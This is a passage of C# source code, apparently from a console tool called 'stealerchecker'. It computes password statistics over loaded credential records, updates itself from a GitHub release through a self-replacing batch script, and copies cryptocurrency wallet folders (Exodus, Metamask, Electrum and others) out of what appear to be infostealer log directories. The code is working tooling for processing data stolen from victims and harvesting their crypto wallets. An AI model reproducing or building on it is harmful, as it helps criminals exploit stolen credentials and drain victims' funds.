            return Math.Round(GetPercent(glob.Count, count), 2);
        }
        internal static decimal AnalyzeLoginEqualsPass()
        {
            SetStatus("Analyzing...");
            var count = glob
                .Count(x => x.Pass.Equals(x.Login, StringComparison.OrdinalIgnoreCase));
            SetStatus();

            return Math.Round(GetPercent(glob.Count, count), 2);
        }
        internal static decimal GetPercent(int b, int a)
        {
            if (b == 0) return 0;

            return a / (b / 100M);
        }

        #endregion
        #region UPDATING

        internal static void Update()
        {
            var wc = new WebClient() { Proxy = null };
            wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.282 (Edition Yx GX)";

            var json = JObject.Parse(wc.DownloadString("https://api.github.com/repos/kzorin52/stealerchecker/releases/latest"));
            var lastestTag = json["tag_name"].ToString();
            var downUrl = json["assets"].ToList()[0]["browser_download_url"].ToString();

            if (tag != lastestTag)
            {
                Console.WriteLine("Updating...", Color.LightGreen);
                wc.DownloadFile(downUrl, "Update.rar");
                var currentName = Assembly.GetExecutingAssembly().GetName().Name;

                var archive = ArchiveFactory.Open("Update.rar");
                foreach (var entry in archive.Entries)
                {
                    if (!entry.IsDirectory)
                    {
                        try
                        {
                            if (!entry.Key.Contains("stealerchecker"))
                                entry.WriteToDirectory(Directory.GetCurrentDirectory(), new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
                            else
                            {
                                using var stream = new FileStream("stealerchecker_new.exe", FileMode.OpenOrCreate); // эта параша не ворк
                                entry.WriteTo(stream); // потому что кривая либа
                                stream.Flush(); // принимает exe за архив и распаковывает только часть exe
                            }
                        }
                        catch { }
                    }
                }

                var content = "@echo off" + NewLine
                    + "timeout 2 > NUL" + NewLine
                    + $"move /Y stealerchecker_new.exe {currentName}.exe" + NewLine
                    // + "del Update.rar" + NewLine
                    + "del %~s0 /q";
                File.WriteAllText("update.cmd", content);

                Process.Start("update.cmd");
                Process.GetProcessesByName(currentName).ToList().ForEach(x => x.Kill());
                Environment.Exit(0);
            }
        }

        #endregion
        #region WALLETS

        private static readonly List<string> wallets = new()
        {
            "Atomic",
            "Exodus",
            "Electrum",
            "NetboxWallet",
            "Monero",
            "Bitcoin",
            "Lobstex",
            "Koto",
            "Metamask",
            "Dogecoin",
            "HappyCoin",
            "curecoin",
            "BitcoinGod",
            "BinanceChain",
            "Tronlink",
            "BitcoinCore",
            "Armory",
            "LitecoinCore"
        };
        static void GetAllWallets() { foreach (var wallet in wallets) GetSpecWallets(wallet); }
        static void GetSpecWallets(string WalletName)
        {
            var withWallet = files
                .Where(file => Directory.Exists(Path.Combine(new FileInfo(file).Directory.FullName, "Wallets", WalletName)))
                .Select(file => new FileInfo(file).Directory.FullName);

            if (!Directory.Exists(Path.Combine("Wallets", WalletName)))
                Directory.CreateDirectory(Path.Combine("Wallets", WalletName));

            int counter = 0;
            foreach (var walletFolder in withWallet)
            {
                SetStatus($"Working... [{WalletName}] [{counter}/{withWallet.Count()}]");
                CopyFilesRecursively(Path.Combine(walletFolder, "Wallets", WalletName), Path.Combine("Wallets", WalletName, new DirectoryInfo(walletFolder).Name));
                counter++;
            }

            Console.WriteLine($"Sucsess [{WalletName}]!", Color.LightGreen);
            SetStatus();
        }

        #endregion
    }

    internal static class Ext
    {
        public static void Print(this Menu menu)
        {
            Console.Clear();
            Console.WriteLine(menu.Name, Color.Pink);
            Console.WriteLine();
            foreach (var item in menu.menu)
                Console.WriteLine($"{menu.menu.IndexOf(item) + 1}. {item.Key}", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Print(menu);
            }

            Console.WriteLine();

            if (selection == 55)
            {
                Console.Clear();
                PrintMainMenu();
            }

            if (selection > menu.menu.Count || selection < 1)
                Print(menu);
            try
            {
                menu.menu[selection - 1].Value();
            }
            catch { Print(menu); }

            PrintMainMenu();
        }
        internal static void WriteLine(this StringBuilder builder, string value) => builder.Append(value).Append(Environment.NewLine);
        public static string input(string text, Color color)
        {
            Console.WriteLine(text, color);
            return Console.ReadLine();
        }
    }
}